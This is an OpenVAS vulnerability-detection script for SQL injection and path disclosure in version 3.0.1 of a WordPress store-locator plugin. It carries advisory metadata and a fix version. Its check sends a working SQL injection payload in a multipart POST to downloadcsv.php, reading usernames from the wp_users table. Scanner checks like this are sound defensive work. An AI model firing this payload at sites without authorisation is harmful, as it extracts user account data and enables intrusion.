CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802644" );
	script_version( "2019-12-05T15:10:00+0000" );
	script_bugtraq_id( 53795 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2019-12-05 15:10:00 +0000 (Thu, 05 Dec 2019)" );
	script_tag( name: "creation_date", value: "2012-06-21 12:12:12 +0530 (Thu, 21 Jun 2012)" );
	script_name( "WordPress Google Maps Via Store Locator Plus Plugin Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/49391" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/76094" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/store-locator-le/changelog/" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "This script is Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to obtain sensitive
  information, compromise the application, access or modify data, exploit
  latent vulnerabilities in the underlying database." );
	script_tag( name: "affected", value: "WordPress Google Maps Via Store Locator Plus Plugin version 3.0.1" );
	script_tag( name: "insight", value: "- An error exists due to the application displaying the installation path in
    debug output when accessing wp-content/plugins/store-locator-le/core/load_
    wp_config.php.

  - Input passed via the 'query' parameter to /wp-content/plugins/store-
    locator-le/downloadcsv.php is not properly sanitised before being used
    in a SQL query. This can be exploited to manipulate SQL queries by
    injecting arbitrary SQL code." );
	script_tag( name: "solution", value: "Update to Google Maps Via Store Locator Plus Plugin version 3.0.5 or later." );
	script_tag( name: "summary", value: "This host is running WordPress Google Maps Via Store Locator Plus
  Plugin and is prone to multiple vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/store-locator-le/downloadcsv.php";
host = http_host_name( port: port );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: multipart/form-data; boundary=----------------------------7e0b3991dc3a\\r\\n", "Content-Length: 223\\r\\n\\r\\n", "------------------------------7e0b3991dc3a\\r\\n", "Content-Disposition: form-data; name=\"query\"", "\\r\\n", "\\r\\n", "SELECT concat(0x53514c692d54657374,0x3a,user_login,0x3a,0x53514c692d54657374) FROM wp_users\\r\\n", "------------------------------7e0b3991dc3a--\\r\\n\\r\\n" );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(res && IsMatchRegexp( res, "SQLi-Test:(.+):SQLi-Test" )){
	security_message( port );
}

